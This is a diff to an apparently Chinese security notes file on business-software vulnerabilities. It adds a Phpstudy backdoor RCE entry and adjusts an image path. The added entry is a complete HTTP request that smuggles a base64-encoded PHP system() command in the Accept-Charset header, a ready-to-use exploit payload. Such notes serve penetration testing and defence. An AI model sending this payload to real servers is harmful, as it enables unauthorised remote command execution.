@@ -260,6 +260,23 @@
 - POC | Payload | exp
     - https://mrxn.net/Infiltration/641.html
 
+### Phpstudy
+**Phpstudy 后门RCE**
+- POC | Payload | exp
+    ```
+    GET /1.php HTTP/1.1
+    Host: example.com
+    Cache-Control: max-age=0
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.9
+    Accept-Encoding:gzip,deflate
+    Accept-Charset:这里就是要执行的命令base64加密 c3lzdGVtKCdjYWxjLmV4ZScpOw==
+    Cookie: UM_distinctid=16ae380e49f27e-0987ab403bca49-3c604504-1fa400-16ae380e4a011b; CNZZDATA3801251=cnzz_eid%3D1063495559-1558595034-%26ntime%3D1559102092; CNZZDATA1670348=cnzz_eid%3D213162126-1559207282-%26ntime%3D1559207282
+    Connection: close
+    ```
+
 ---
 
 # 数据库
@@ -346,7 +363,7 @@
 
         利用 log 变量，猜绝对路径
 
-        ![image](../../../assets/img/安全/笔记/业务软件vul整合笔记/1.png)
+        ![image](../../../../assets/img/安全/笔记/业务软件vul整合笔记/1.png)
 
         或者直接查询 `select @@basedir;`
 
